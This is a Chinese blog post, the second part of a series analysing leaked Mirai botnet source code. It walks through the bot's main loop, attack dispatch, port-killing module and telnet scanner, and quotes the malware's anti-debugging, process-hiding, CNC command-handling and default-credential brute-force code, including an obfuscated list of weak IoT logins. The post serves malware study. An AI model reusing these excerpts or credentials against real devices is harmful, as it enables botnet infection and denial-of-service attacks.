
<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8" />
    <title>Mirai源码读后感II | 清风之恋の小窝</title>
    <meta name="author" content="清风之恋" />
    <meta name="description" content="ええ...?被找到了呢,这里会不定期更新一些好玩的东西哦" />
    <meta name="keywords" content="清风之恋,aurora0x27,aurora" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
    />
    <link rel="icon" href="/images/nachoneko.png" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.cn" />
<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
<link
    rel="stylesheet"
    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
/>
<script> const mixins = {}; </script>

<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/vs.min.css"
/>
<script src="/js/lib/highlight.js"></script>


<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
<script src="/js/lib/math.js"></script>


<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>清风之恋の小窝</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;清风之恋の小窝</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>Mirai源码读后感II</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/8/12
        </span>
        
        <span class="category">
            <a href="/categories/Mirai%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Mirai源码分析
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/%E5%90%B9%E6%B0%B4/" style="color: #00bcd4">
                    吹水
                </a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>

        <!--toc-->

        <p>Mirai源码分析第二部分</p>
<span id="more"></span>

<a href="/2024/08/12/MiraiSourceCodeNotes/" title="Mirai源码读后感I">上一篇</a>

<h2 id="3-本体payload部分"><a href="#3-本体payload部分" class="headerlink" title="3. 本体payload部分"></a>3. 本体payload部分</h2><p>本体的源码路径在 <code>/mirai/bot</code> , 是在被攻击机器(客户机)上执行的代码.</p>
<pre><code class="sh">Mirai-Source-Code/mirai/bot
├── attack_app.c
├── attack.c --------&gt; 执行Dos攻击行为的部分, 配合其他几个 attack_*.c, 实现不同的攻击方式
├── attack_gre.c
├── attack.h
├── attack_tcp.c
├── attack_udp.c
├── checksum.c-------&gt; 校验数据和指令
├── checksum.h
├── includes.h
├── killer.c---------&gt; 用于排除异己
├── killer.h
├── main.c ----------&gt; 入口函数
├── protocol.h
├── rand.c-----------&gt; 产生随机数
├── rand.h
├── resolv.c---------&gt; 负责和DNS服务器通信, 进行域名解析
├── resolv.h
├── scanner.c--------&gt; 扫描其他可能的设备, 并将结果返回给loader模块, 进行散布
├── scanner.h
├── table.c----------&gt; 维护数据表, 储存如设备ID, 受感染设备特征信息
├── table.h
├── util.c-----------&gt; 提供基础的工具函数, 如字符串处理和内存搜索
└── util.h
</code></pre>
<h3 id="3-1-主流程"><a href="#3-1-主流程" class="headerlink" title="3.1 主流程"></a>3.1 主流程</h3><ul>
<li>首先自身解除链接, 并关闭watchdog, 防止电脑重启, 并防止gdb进行调试</li>
</ul>
<pre><code class="c">// Delete self
unlink(args[0]);

// Signal based control flow
sigemptyset(&amp;sigs);
sigaddset(&amp;sigs, SIGINT);
sigprocmask(SIG_BLOCK, &amp;sigs, NULL);
signal(SIGCHLD, SIG_IGN);
signal(SIGTRAP, &amp;anti_gdb_entry);

// Prevent watchdog from rebooting device
if ((wfd = open(&quot;/dev/watchdog&quot;, 2)) != -1 ||
    (wfd = open(&quot;/dev/misc/watchdog&quot;, 2)) != -1)
&#123;
    int one = 1;

    ioctl(wfd, 0x80045704, &amp;one);
    close(wfd);
    wfd = 0;
&#125;
chdir(&quot;/&quot;);

// ......

#ifdef DEBUG
    unlock_tbl_if_nodebug(args[0]);
    anti_gdb_entry(0);
#else
    if (unlock_tbl_if_nodebug(args[0]))
        raise(SIGTRAP);
#endif
</code></pre>
<ul>
<li>隐藏自身名称和进程名</li>
</ul>
<pre><code class="c">// Hide argv0
name_buf_len = ((rand_next() % 4) + 3) * 4;
rand_alphastr(name_buf, name_buf_len);
name_buf[name_buf_len] = 0;
util_strcpy(args[0], name_buf);

// Hide process name
name_buf_len = ((rand_next() % 6) + 3) * 4;
rand_alphastr(name_buf, name_buf_len);
name_buf[name_buf_len] = 0;
prctl(PR_SET_NAME, name_buf);

// Print out system exec
table_unlock_val(TABLE_EXEC_SUCCESS);
tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &amp;tbl_exec_succ_len);
write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
write(STDOUT, &quot;\n&quot;, 1);
table_lock_val(TABLE_EXEC_SUCCESS);
</code></pre>
<ul>
<li><p>随后进行 <code>attack_init()</code> 和 <code>killer_init()</code> , 之后进入主事件循环</p>
</li>
<li><p>在主事件循环中先通过文件描述符 <code>fd_ctrl</code> 检查自身进程状态, 决定自身进程是否需要被杀死, 这个行为使得Mirai能够保证一台设备上只有一个自己的实例运行, 防止了反复感染同一设备, 提高了扩散效率.</p>
</li>
</ul>
<pre><code class="c">// Check if we need to kill ourselves
if (fd_ctrl != -1 &amp;&amp; FD_ISSET(fd_ctrl, &amp;fdsetrd))
&#123;
    struct sockaddr_in cli_addr;
    socklen_t cli_addr_len = sizeof (cli_addr);

    accept(fd_ctrl, (struct sockaddr *)&amp;cli_addr, &amp;cli_addr_len);

#ifdef DEBUG
    printf(&quot;[main] Detected newer instance running! Killing self\n&quot;);
#endif
#ifdef MIRAI_TELNET
    scanner_kill();
#endif
    killer_kill();
    attack_kill_all();
    kill(pgid * -1, 9);
    exit(0);
&#125;
</code></pre>
<ul>
<li>在主循环中监听CNC的信息, 并解析攻击参数</li>
</ul>
<pre><code class="c">// ......

// Try to read in buffer from CNC
errno = 0;
n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
if (n == -1)
&#123;
    if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
        continue;
    else
        n = 0;
&#125;

// If n == 0 then we close the connection!
if (n == 0)
&#123;
#ifdef DEBUG
    printf(&quot;[main] Lost connection with CNC (errno = %d) 2\n&quot;, errno);
#endif
    teardown_connection();
    continue;
&#125;

// Actually read buffer length and buffer data
recv(fd_serv, &amp;len, sizeof (len), MSG_NOSIGNAL);
len = ntohs(len);
recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
printf(&quot;[main] Received %d bytes from CNC\n&quot;, len);
#endif

if (len &gt; 0)
    attack_parse(rdbuf, len);
</code></pre>
<h3 id="3-2-attack部分"><a href="#3-2-attack部分" class="headerlink" title="3.2 attack部分"></a>3.2 attack部分</h3><p>attack部分主要有以下几个文件组成</p>
<pre><code>attack_app.c
attack.c
attack_gre.c
attack.h
attack_tcp.c
attack_udp.c
</code></pre>
<p>他们分别实现了不同的攻击方式, <code>attack.c</code> 负责解析攻击参数, 调用对应的函数进行特定方式的攻击</p>
<pre><code class="c">void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
&#123;
    int pid1, pid2;

    pid1 = fork();
    if (pid1 == -1 || pid1 &gt; 0)
        return;

    pid2 = fork();
    if (pid2 == -1)
        exit(0);
    else if (pid2 == 0)
    &#123;
        sleep(duration);
        kill(getppid(), 9);
        exit(0);
    &#125;
    else
    &#123;
        int i;

        for (i = 0; i &lt; methods_len; i++)
        &#123;
            if (methods[i]-&gt;vector == vector)
            &#123;
#ifdef DEBUG
                printf(&quot;[attack] Starting attack...\n&quot;);
#endif
                methods[i]-&gt;func(targs_len, targs, opts_len, opts); // 使用函数指针实现了类似重载的效果
                break;
            &#125;
        &#125;

        //just bail if the function returns
        exit(0);
    &#125;
&#125;
</code></pre>
<p>其中这个 <code>methods</code> 结构体定义如下</p>
<pre><code class="c">struct attack_method &#123;
    ATTACK_FUNC func;       // 函数指针
    ATTACK_VECTOR vector;
&#125;;
</code></pre>
<p>其中的攻击函数接口是设计统一的, 可以实现类似C++的函数重载, 多种攻击方式共用同一套接口实现, 这是部分的函数接口</p>
<pre><code class="c">void attack_udp_generic     (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_vse         (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_dns         (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_plain       (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
</code></pre>
<h3 id="3-3-killer部分"><a href="#3-3-killer部分" class="headerlink" title="3.3 killer部分"></a>3.3 killer部分</h3><p>killer部分只有2个文件, 其中实现了查找杀死同类程序并占用端口的行为, 向外暴露的函数只有3个: </p>
<pre><code class="c">void killer_init(void);             // 初始化函数
void killer_kill(void);
BOOL killer_kill_by_port(port_t);
</code></pre>
<p>该部分会杀死在端口22, 23, 80的进程, 并占用这三个端口, 防止端口被重新启用</p>
<h3 id="3-4-scanner部分"><a href="#3-4-scanner部分" class="headerlink" title="3.4 scanner部分"></a>3.4 scanner部分</h3><p>scanner部分会构造随机ip, 寻找可能连接的机器, 并尝试进行telnet连接, 使用23端口试图连接, 如果有回应就会尝试使用已经储存的弱密码登陆</p>
<pre><code class="c">// 源码中的部分尝试登陆
add_auth_entry(&quot;\x51\x57\x52\x52\x4D\x50\x56&quot;, &quot;\x51\x57\x52\x52\x4D\x50\x56&quot;, 5);      // support  support
add_auth_entry(&quot;\x50\x4D\x4D\x56&quot;, &quot;&quot;, 4);                                              // root     (none)
add_auth_entry(&quot;\x43\x46\x4F\x4B\x4C&quot;, &quot;\x52\x43\x51\x51\x55\x4D\x50\x46&quot;, 4);          // admin    password
add_auth_entry(&quot;\x50\x4D\x4D\x56&quot;, &quot;\x50\x4D\x4D\x56&quot;, 4);                              // root     root
add_auth_entry(&quot;\x50\x4D\x4D\x56&quot;, &quot;\x13\x10\x11\x16\x17&quot;, 4);                          // root     12345
add_auth_entry(&quot;\x57\x51\x47\x50&quot;, &quot;\x57\x51\x47\x50&quot;, 3);                              // user     user
add_auth_entry(&quot;\x43\x46\x4F\x4B\x4C&quot;, &quot;&quot;, 3);                                          // admin    (none)
add_auth_entry(&quot;\x50\x4D\x4D\x56&quot;, &quot;\x52\x43\x51\x51&quot;, 3);                              // root     pass
add_auth_entry(&quot;\x43\x46\x4F\x4B\x4C&quot;, &quot;\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16&quot;, 3);      // admin    admin1234
add_auth_entry(&quot;\x50\x4D\x4D\x56&quot;, &quot;\x13\x13\x13\x13&quot;, 3);                              // root     1111
add_auth_entry(&quot;\x43\x46\x4F\x4B\x4C&quot;, &quot;\x51\x4F\x41\x43\x46\x4F\x4B\x4C&quot;, 3);          // admin    smcadmin
</code></pre>
<p>尝试登陆成功后会获取受感染机器的信息, 并发回给loader, (scannerListen.go进行处理)</p>
<pre><code class="c">            switch (conn-&gt;state)
            &#123;
            case SC_HANDLE_IACS:
                if ((consumed = consume_iacs(conn)) &gt; 0)
                &#123;
                    conn-&gt;state = SC_WAITING_USERNAME;
#ifdef DEBUG
                    printf(&quot;[scanner] FD%d finished telnet negotiation\n&quot;, conn-&gt;fd);
#endif
                &#125;
                break;
            case SC_WAITING_USERNAME:
                if ((consumed = consume_user_prompt(conn)) &gt; 0)
                &#123;
                    send(conn-&gt;fd, conn-&gt;auth-&gt;username, conn-&gt;auth-&gt;username_len, MSG_NOSIGNAL);
                    send(conn-&gt;fd, &quot;\r\n&quot;, 2, MSG_NOSIGNAL);
                    conn-&gt;state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                    printf(&quot;[scanner] FD%d received username prompt\n&quot;, conn-&gt;fd);
#endif
                &#125;
                break;
            case SC_WAITING_PASSWORD:
                if ((consumed = consume_pass_prompt(conn)) &gt; 0)
                &#123;
#ifdef DEBUG
                    printf(&quot;[scanner] FD%d received password prompt\n&quot;, conn-&gt;fd);
#endif

                    // Send password
                    send(conn-&gt;fd, conn-&gt;auth-&gt;password, conn-&gt;auth-&gt;password_len, MSG_NOSIGNAL);
                    send(conn-&gt;fd, &quot;\r\n&quot;, 2, MSG_NOSIGNAL);

                    conn-&gt;state = SC_WAITING_PASSWD_RESP;
                &#125;
                break;

                    // .......

            &#125;
</code></pre>
<h3 id="3-5-其他部分"><a href="#3-5-其他部分" class="headerlink" title="3.5 其他部分"></a>3.5 其他部分</h3><pre><code>protocol.h-&gt; 网络协议相关的数据结构和宏
chechsum.c-&gt; 提供两个checksum函数, 只在scanner部分中向loader发回信息的时候才调用
chechsum.h
table.c ---&gt; 内置一份数据表, 用于随机扫描和尝试弱密码登陆, 以及数据表相关的函数
table.h
util.c ----&gt; 提供一些工具函数, 如字符串处理和获取本机ip地址
util.h
</code></pre>
<a href="/2024/08/12/MiraiSourceCodeNotes2/" title="Mirai源码读后感III">下一篇</a>

    </div>
    
    
    
    
    <div id="comment">
        <div id="giscus-container" class="giscus"></div>
    </div>
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2024 - 2024 清风之恋の小窝
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;清风之恋
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<!--toc-->
<div id="toc" style="position:fixed;bottom:10%;left:10px;cursor: pointer;">
    
    <div id="toc">
        <!--
        <strong class="sidebar-title">目录</strong>
        -->
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%9C%AC%E4%BD%93payload%E9%83%A8%E5%88%86"><span class="toc-text">3. 本体payload部分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E4%B8%BB%E6%B5%81%E7%A8%8B"><span class="toc-text">3.1 主流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-attack%E9%83%A8%E5%88%86"><span class="toc-text">3.2 attack部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-killer%E9%83%A8%E5%88%86"><span class="toc-text">3.3 killer部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-scanner%E9%83%A8%E5%88%86"><span class="toc-text">3.4 scanner部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-%E5%85%B6%E4%BB%96%E9%83%A8%E5%88%86"><span class="toc-text">3.5 其他部分</span></a></li></ol></li></ol>
    </div>


</div>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    
<script
    src="https://giscus.app/client.js"
    data-repo="aurora0x27/aurora0x27.github.io"
    data-repo-id="R_kgDOMfB-WQ"
    data-category="Announcements"
    data-category-id="DIC_kwDOMfB-Wc4ChZUZ"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="bottom"
    data-theme="light"
    data-lang="zh-CN"
    crossorigin
    async
></script>





    
</body>
</html>
